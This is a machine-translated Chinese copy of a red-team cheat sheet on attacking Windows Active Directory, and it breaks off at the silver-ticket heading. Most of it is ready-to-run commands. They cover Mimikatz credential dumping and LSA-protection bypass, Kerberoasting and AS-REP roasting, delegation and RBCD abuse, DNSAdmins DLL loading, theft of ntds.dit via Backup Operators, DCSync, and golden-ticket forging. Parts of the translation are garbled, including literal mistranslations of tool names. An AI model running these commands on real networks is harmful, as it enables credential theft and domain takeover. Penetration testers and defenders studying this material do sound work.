# 活动目录备忘单:第 2 部分

> 原文：<https://infosecwriteups.com/active-directory-cheatsheet-part-2-b18e9aa2e73a?source=collection_archive---------2----------------------->

## 与广告相关的所有内容的大列表

![](img/15d138a9abe502626c74348925f1d4a4.png)

unsplash.com

# 域枚举

# 使用 PowerView

[power view v . 3.0](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
[power view Wiki](https://powersploit.readthedocs.io/en/latest/)

*   获取当前域:`Get-Domain`
*   枚举其他域:`Get-Domain -Domain <DomainName>`
*   获取域 SID: `Get-DomainSID`
*   获取域策略:

`Get-DomainPolicy #Will show us the policy configurations of the Domain about system access or kerberos Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy`

获取域控制器:

*   `Get-DomainController Get-DomainController -Domain <DomainName>`
*   枚举域用户:

```
#Save all Domain Users to a file Get-DomainUser | Out-File -FilePath .\DomainUsers.txt  #Will return specific properties of a specific user Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List  #Enumerate user logged on a machine Get-NetLoggedon -ComputerName <ComputerName>  #Enumerate Session Information for a machine Get-NetSession -ComputerName <ComputerName>  #Enumerate domain machines of the current/specified domain where specific users are logged into Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName Enum Domain Computers:Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName  #Enumerate Live machines  Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
```

枚举组和组成员:

```
#Save all Domain Groups to a file: Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt  #Return members of Specific Group (eg. Domain Admins & Enterprise Admins) Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member  Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName  #Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine Get-NetLocalGroup | Select-Object GroupName  #Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain  #Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
```

枚举共享:

`#Enumerate Domain Shares Find-DomainShare #Enumerate Domain Shares the current user has access Find-DomainShare -CheckShareAccess #Enumerate "Interesting" Files on accessible shares Find-InterestingDomainShareFile -Include *passwords*`

枚举组策略:

*   `Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName #Enumerate all GPOs to a specific computer Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName #Get users that are part of a Machine's local Admin group Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>`
*   枚举 ou:

`Get-DomainOU -Properties Name | Sort-Object -Property Name`

*   枚举 ACL:

`# Returns the ACLs associated with the specified account Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs #Search for interesting ACEs Find-InterestingDomainAcl -ResolveGUIDs #Check the ACLs associated with a specified path (e.g smb share) Get-PathAcl -Path "\\Path\Of\A\Share"`

*   枚举域信任:

`Get-DomainTrust Get-DomainTrust -Domain <DomainName> #Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds Get-DomainTrustMapping`

*   枚举林信任:

`Get-ForestDomain Get-ForestDomain -Forest <ForestName> #Map the Trust of the Forest Get-ForestTrust Get-ForestTrust -Forest <ForestName>`

用户搜寻:

*   `#Finds all machines on the current domain where the current user has local admin access Find-LocalAdminAccess -Verbose #Find local admins on all machines of the domain Find-DomainLocalGroupMember -Verbose #Find computers were a Domain Admin OR a spesified user has a session Find-DomainUserLocation | Select-Object UserName, SessionFromName #Confirming admin access Test-AdminAccess`

❗特权 Esc 域管理员与用户狩猎:
我有一台机器上的本地管理员访问权限- >一个域管理员在那台机器上有一个会话- >我窃取他的令牌，并冒充他- >利润！

# 使用 AD 模块

*   获取当前域:`Get-ADDomain`
*   枚举其他域:`Get-ADDomain -Identity <Domain>`
*   获取域 SID: `Get-DomainSID`
*   获取域控制器:

`Get-ADDomainController Get-ADDomainController -Identity <DomainName>`

枚举域用户:

`Get-ADUser -Filter * -Identity <user> -Properties * #Get a spesific "string" on a user's attribute Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description`

枚举域计算机:

*   `Get-ADComputer -Filter * -Properties * Get-ADGroup -Filter *`

枚举域信任:

*   `Get-ADTrust -Filter * Get-ADTrust -Identity <DomainName>`

枚举林信任:

*   `Get-ADForest Get-ADForest -Identity <ForestName> #Domains of Forest Enumeration (Get-ADForest).Domains`
*   枚举本地 AppLocker 有效策略:

```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

# 使用警犬

## 远程侦探犬

[Python BloodHound 库](https://github.com/fox-it/BloodHound.py)或者用`pip3 install bloodhound`安装

```
bloodhound-python -u <UserName> -p <Password> -ns <Domain Controller's Ip> -d <Domain> -c All
```

## 现场警犬

```
#Using exe ingestor
.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller's Ip> --OutputDirectory <PathToFile>

#Using powershell module ingestor
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>
```

# 有用的枚举工具

*   [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) 通过 LDAP 进行信息转储
*   [adidnsdump](https://github.com/dirkjanm/adidnsdump) 任何认证用户的集成 DNS 转储
*   [权限](https://github.com/cyberark/ACLight)特权帐户的高级发现
*   [ADRecon](https://github.com/sense-of-security/ADRecon) 详细的活动目录重建工具

# 本地权限提升

*   [多汁的土豆](https://github.com/ohpe/juicy-potato)滥用 SeImpersonate 或 SeAssignPrimaryToken 特权进行系统模拟
*   ⚠️只能运行到 Windows Server 2016，Windows 10 只能运行到 1803 补丁
*   [可爱的土豆](https://github.com/TsukiCTF/Lovely-Potato)自动化多汁土豆
*   ⚠️只能运行到 Windows Server 2016，Windows 10 只能运行到 1803 补丁
*   [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) 利用 PrinterBug 进行系统模拟
*   🙏适用于 Windows Server 2019 和 Windows 10
*   [RoguePotato](https://github.com/antonioCoco/RoguePotato) 升级版多汁马铃薯
*   🙏适用于 Windows Server 2019 和 Windows 10
*   [滥用代币特权](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
*   [SMBGhost CVE-2020–0796](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/)
    [概念验证](https://github.com/danigargu/CVE-2020-0796)
*   [CVE-2021–36934](https://github.com/cube0x0/CVE-2021-36934)

# 有用的本地私有 Esc 工具

*   [加电](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1)错误配置滥用
*   [BeRoot](https://github.com/AlessandroZ/BeRoot) 通用权限 Esc 枚举工具
*   [权限描述](https://github.com/enjoiz/Privesc)通用权限描述枚举工具
*   [全权证书](https://github.com/itm4n/FullPowers)恢复服务账户的权限

# 横向运动

# Powershell 远程处理

```
#Enable Powershell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```

# 使用 PS 凭据远程执行代码

```
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```

# 导入 powershell 模块并远程执行其功能

```
#Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess #Interact with the session
Enter-PSSession -Session $sess
```

# 执行远程状态命令

```
#Create a new session
$sess = New-PSSession -ComputerName <NameOfComputer>#Execute command on the session
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}#Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}
```

# 米米卡茨

```
#The commands are in cobalt strike format!#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp#List cached MasterKeys
mimikatz sekurlsa::dpapi#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys#Dump SAM Database
mimikatz lsadump::sam#Dump SECRETS Database
mimikatz lsadump::secrets#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all#List and Dump local kerberos credentials
mimikatz kerberos::list /dump#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>#List TS/RDP sessions
mimikatz ts::sessions#List Vault credentials
mimikatz vault::list
```

❗如果 mimikatz 因为 LSA 保护控制而无法转储凭证，该怎么办？\

*   LSA 作为受保护的进程(内核土地旁路)

```
#Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa#Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
#Now lets import the mimidriver.sys to the system
mimikatz # !+#Now lets remove the protection flags from lsass.exe process
mimikatz # !processprotect /process:lsass.exe /remove#Finally run the logonpasswords function to dump lsass
mimikatz # sekurlsa::logonpasswords
```

*   LSA 作为受保护的进程(用户土地“无文件”绕过)
*   [PPLdump](https://github.com/itm4n/PPLdump)
*   [绕过用户区的 LSA 保护](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)
*   LSA 由凭据保护作为虚拟化进程(LSAISO)运行

```
#Check if a process called lsaiso.exe exists on the running processes
tasklist |findstr lsaiso#If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
#Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
mimikatz # misc::memssp#Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
```

*   [详细的 Mimikatz 指南](https://adsecurity.org/?page_id=1821)
*   [用 2 个 lsass 保护选项四处打探](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)

# 有用的工具

*   [Powercat](https://github.com/besimorhino/powercat) netcat 用 powershell 编写，提供隧道、中继和端口转发功能。
*   [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) 依靠 ChangeServiceConfigA 运行命令的无文件横向移动工具
*   用于黑客攻击/测试的终极 Winrm 外壳
*   [RunasCs](https://github.com/antonioCoco/RunasCs) Csharp 和 windows 内置 runas.exe 的开放版本

# 域权限提升

# Kerberoast

*WUT 是 DIS？:*
所有标准域用户都可以请求所有服务帐户及其相关密码哈希的副本，因此我们可以向 TGS 请求绑定到“用户”
帐户的任何 SPN，提取使用用户密码加密的加密 blob 并强制其离线。

*   PowerView:

```
#Get User Accounts that are used as Service Accounts
Get-NetUser -SPN#Get every available SPN account, request a TGS and dump its hash
Invoke-Kerberoast#Requesting the TGS for a single account:
Request-SPNTicket

#Export all tickets using Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

*   广告模块:

```
#Get User Accounts that are used as Service Accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

*   插入包:

```
python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
```

*   鲁伯:

```
#Kerberoasting and outputing on a file with a spesific format
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>#Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec#Kerberoast AES enabled accounts
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes

#Kerberoast spesific user account
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple#Kerberoast by specifying the authentication credentials 
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
```

# ASREPRoast

*WUT 是 DIS？:*
如果一个域用户帐户不需要 kerberos 预认证，我们甚至可以在没有域凭证的情况下为该帐户请求一个有效的 TGT，提取加密的
blob 并强制其离线。

*   PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
*   广告模块:`Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

在我拥有写权限或更多权限的帐户上强制禁用 Kerberos 预验证！检查帐户上有趣的权限:

提示:我们添加了一个过滤器，例如 RDPUsers，以获得“用户帐户”而不是机器帐户，因为机器帐户哈希是不可破解的！

PowerView:

```
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
Disable Kerberos Preauth:
Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose
```

最后使用[as repast](https://github.com/HarmJ0y/ASREPRoast)工具执行攻击。

```
#Get a spesific Accounts hash:
Get-ASREPHash -UserName <UserName> -Verbose#Get any ASREPRoastable Users hashes:
Invoke-ASREPRoast -Verbose
```

使用红色:

```
#Trying the attack for all domain users
Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>#ASREPRoast spesific user
Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>#ASREPRoast users of a spesific OU (Organization Unit)
Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
```

使用 Impacket:

```
#Trying the attack for the specified users on the file
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
```

# 密码喷雾攻击

如果我们通过泄露用户帐户获得了一些密码，我们可以使用这种方法来尝试和利用其他域帐户上的密码重用。

工具:

*   [域名密码祈祷](https://github.com/dafthack/DomainPasswordSpray)
*   [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
*   [调用-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
*   [喷](https://github.com/Greenwolf/Spray)

# 强制设置 SPN

*WUT 是 DIS？:如果我们有足够的权限- > GenericAll/GenericWrite 我们可以在一个目标帐户上设置一个 SPN，请求一个 TGS，然后抓取它的 blob 并强制执行。*

*   PowerView:

```
#Check for interesting permissions on accounts:
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}

#Check if current user has already an SPN setted:
Get-DomainUser -Identity <UserName> | select serviceprincipalname

#Force set the SPN on the account:
Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
```

*   广告模块:

```
#Check if current user has already an SPN setted
Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName

#Force set the SPN on the account:
Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
```

最后，使用之前的任何工具获取 hash 并进行 kerberoast 认证！

# 滥用卷影副本

如果您在一台机器上有本地管理员权限，请尝试列出卷影副本，这是一种简单的域升级方法。

```
#List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows

#List shadow copies using diskshadow
diskshadow list shadows all

#Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

1.  您可以转储备份的 SAM 数据库并收集凭据。
2.  查找 DPAPI 存储的凭证并解密它们。
3.  访问备份的敏感文件。

# 使用 Mimikatz 列出并解密存储的凭证

通常，加密的凭据存储在:

*   `%appdata%\Microsoft\Credentials`
*   `%localappdata%\Microsoft\Credentials`

```
#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential
#Lets enumerate the Master Key:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc#We now have the masterkey in our local cache:
dpapi::cache#Finally we can decrypt the credential using the cached masterkey:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
```

详细文章: [DPAPI 所有的东西](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

# 不受限制的委托

*WUT 是 DIS？:如果我们在启用了无约束委派的机器上具有管理访问权限，我们可以等待高价值目标或 DA 连接到该机器，窃取他的 TGT，然后进行 ptt 并冒充他！*

使用 PowerView:

```
#Discover domain joined computers that have Unconstrained Delegation enabled
Get-NetComputer -UnConstrained#List tickets and check if a DA or some High Value target has stored its TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets"'#Command to monitor any incoming sessions on our compromised server
Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay   
<WaitInterval> -Verbose#Dump the tickets to disk:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'#Impersonate the user using ptt attack:
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
```

注意:我们也可以用鲁伯！

# 受约束的委托

使用 PowerView 和 Kekeo:

```
#Enumerate Users and Computers with constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN>#Finally use mimikatz to ptt the TGS
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
```

*替代:*使用红色:

```
Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt
```

现在我们可以以模拟用户的身份访问服务了！

🚩如果我们只有一个特定的 SPN 的委托权限会怎么样？(例如时间):

在这种情况下，我们仍然可以滥用 kerberos 的一个称为“替代服务”的特性。这使得我们可以请求 TGS 其他“替代”服务的门票，而不仅仅是我们有权利的服务。这使我们能够为主机支持的任何服务请求有效的票证，使我们能够完全访问目标机器。

# 基于资源的受限委托

*WUT 是 DIS？:
TL；如果我们在一个域的机器帐户对象上有 GenericALL/GenericWrite 特权，我们就可以滥用它，并把我们自己冒充成这个域的任何用户。例如，我们可以模拟域管理员并拥有完全的访问权限。*

我们将使用的工具:

*   [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)
*   [动力狂](https://github.com/Kevin-Robertson/Powermad)
*   [红色](https://github.com/GhostPack/Rubeus)

首先，我们需要输入对该对象拥有权限的用户/机器帐户的安全上下文。如果这是一个用户帐户，我们可以使用通过哈希，RDP，PSCredentials 等。

利用示例:

```
#Import Powermad and use it to create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose#Import PowerView and get the SID of our new created machine account
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength) 
$SD.GetBinaryForm($SDBytes, 0)#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose#After that we need to get the RC4 hash of the new machine account's password using Rubeus
Rubeus.exe hash /password:'p@ssword!'#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt#Finally we can access the C$ drive of the target machine
dir \\TargetMachine.wtver.domain\C$
```

详细文章:

*   [顾全大局:滥用基于资源的约束委托攻击活动目录](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
*   [基于资源的受限委托滥用](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)

约束和基于资源的约束委托中的❗如果我们没有试图滥用的 TRUSTED_TO_AUTH_FOR_DELEGATION 帐户的密码/哈希，我们可以使用 kekeo 的“tgt::deleg”或 rubeus 的“tgtdeleg”这一非常好的技巧，骗过 Kerberos 给我们一个该帐户的有效 tgt。然后，我们只需使用票证而不是帐户的哈希来执行攻击。

```
#Command on Rubeus
Rubeus.exe tgtdeleg /nowrap
```

详细文章:[rube us——现在有更多 Kekeo](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)

# 滥用 DNSAdmins

WUT 是迪斯？:如果用户是 DNSAdmins 组的成员，他可能会以 dns.exe 的权限加载任意 DLL，作为 SYSTEM 运行。如果 DC 为 DNS 提供服务，用户可以将其权限提升至 DA。该攻击过程需要重新启动 DNS 服务的权限才能运行。

1.  枚举 DNSAdmins 组的成员:

*   PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
*   广告模块:`Get-ADGroupMember -Identiny DNSAdmins`

1.  一旦我们找到了这个群体中的一员，我们就需要妥协(有很多方法)。
2.  然后，通过在 SMB 共享上提供恶意 dll 并配置 DLL 使用，我们可以提升我们的权限:

*   `#Using dnscmd: dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll #Restart the DNS Service: sc \\DNSServer stop dns sc \\DNSServer start dns`

# 滥用活动目录集成的 DNS

*   [利用集成活动目录的 DNS](https://blog.netspi.com/exploiting-adidns/)
*   [再次访问 ADI DNS](https://blog.netspi.com/adidns-revisited/)
*   [漫骂](https://github.com/Kevin-Robertson/Inveigh)

# 滥用备份操作员组

*WUT 是 DIS？:如果我们设法侵入属于 Backup Operators 组成员的用户帐户，我们就可以滥用其权限来创建 DC 当前状态的卷影副本，提取 ntds.dit 数据库文件，转储哈希并将我们的权限升级到 DA。*

1.  一旦我们获得了拥有 SeBackupPrivilege 的帐户的访问权限，我们就可以访问 DC 并使用签名的二进制磁盘创建卷影副本卷影:

```
#Create a .txt file that will contain the shadow copy process script
Script ->{
set context persistent nowriters  
set metadata c:\windows\system32\spool\drivers\color\example.cab  
set verbose on  
begin backup  
add volume c: alias mydrive  

create  

expose %mydrive% w:  
end backup  
}#Execute diskshadow with our script as parameter
diskshadow /s script.txt
```

1.  接下来，我们需要访问卷影副本，我们可能有 SeBackupPrivilege，但我们不能简单地复制粘贴 ntds.dit，我们需要模拟备份软件，并使用 Win32 API 调用将其复制到可访问的文件夹中。为此，我们将使用[这个](https://github.com/giuliano108/SeBackupPrivilege)惊人的回购:

```
#Importing both dlls from the repo using powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

#Checking if the SeBackupPrivilege is enabled
Get-SeBackupPrivilege

#If it isn't we enable it
Set-SeBackupPrivilege

#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite

#Dump the SYSTEM hive
reg save HKLM\SYSTEM c:\temp\system.hive
```

1.  使用 impacket 或其他工具中的 smbclient.py，我们在本地机器上复制 ntds.dit 和 SYSTEM hive。
2.  使用 impacket 中的 secretsdump.py 并转储哈希。
3.  使用 psexec 或您选择的其他工具来 PTH 并获得域管理员访问权限。

# 滥用交换

*   [滥用来自 DA 的 Exchange one Api 调用](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
*   [CVE-2020–0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
*   [PrivExchange](https://github.com/dirkjanm/PrivExchange) 滥用 Exchange，用你的权限换取域管理员权限

# 武器化打印机 Bug

*   [打印机服务器对域管理员的 Bug](https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/)
*   [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)

# 滥用 ACL

*   [使用 Active Directory 中的 ACL 提升权限](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
*   [aclpwn.py](https://github.com/fox-it/aclpwn.py)
*   [调用-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)

# 使用 mitm6 滥用 IPv6

*   [通过 IPv6 危及 IPv4 网络](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
*   mitm6

# SID 历史滥用

WUT 是迪斯？:如果我们设法破坏了森林的子域，并且没有启用 [*SID 过滤*](https://www.itprotoday.com/windows-8/sid-filtering) *(大多数情况下没有启用)，我们可以滥用它的权限，将其升级为森林的根域的域管理员。这是可能的，因为 kerberos TGT 票据上的* [*SID 历史*](https://www.itprotoday.com/windows-8/sid-history) *字段定义了“额外的”安全组和特权。*

利用示例:

```
#Get the SID of the Current Domain using PowerView
Get-DomainSID -Domain current.root.domain.local#Get the SID of the Root Domain using PowerView
Get-DomainSID -Domain root.domain.local#Create the Enteprise Admins SID
Format: RootDomainSID-519#Forge "Extra" Golden Ticket using mimikatz
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi#Inject the ticket into memory
kerberos::ptt \path\to\ticket\golden.kirbi#List the DC of the Root Domain
dir \\dc.root.domain.local\C$#Or DCsync and dump the hashes using mimikatz
lsadump::dcsync /domain:root.domain.local /all
```

详细文章:

*   [Kerberos 金券现在更加金色了](https://adsecurity.org/?p=1640)
*   [攻击域信任的指南](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)

# 利用 SharePoint

*   [CVE-2019–0604](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d)RCE 开采
    T21【PoC】
*   [CVE-2019–1257](https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization)通过 BDC 反序列化执行代码
*   [CVE-2020–0932](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters)RCE 使用类型转换器
    [概念验证](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)

# Zerologon

*   [Zerologon:未经认证的域控制器危害](https://www.secura.com/whitepapers/zerologon-whitepaper):漏洞白皮书。
*   [sharp zero logon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon):zero logon 漏洞利用的 C#实现。
*   [Invoke-zero logon](https://github.com/BC-SECURITY/Invoke-ZeroLogon):zero logon 漏洞利用的 Powershell 实现。
*   使用 impacket 库的 Zerologon 漏洞利用的 Python 实现。

# 印刷噩梦

*   [CVE-2021–34527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527):漏洞详情。
*   [PrintNightmare 的 impacket 实现](https://github.com/cube0x0/CVE-2021-1675):使用 Impacket 库的 print nightmare 的可靠 PoC。
*   [CVE-2021–1675](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare)的 C#实现:用 C#写的 PrintNightmare 的可靠 PoC。

# 领域持久性

# 金票攻击

```
#Execute mimikatz on DC as DA to grab krbtgt hash:
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>#On any machine:
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

# DCsync 攻击

```
#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'#DCsync using secretsdump.py from impacket with NTLM authentication
secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm#DCsync using secretsdump.py from impacket with Kerberos Authentication
secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
```

提示:
/ptt - >在当前运行的会话中注入票证
/ticket - >将票证保存在系统中以备后用

# 银票攻击

```
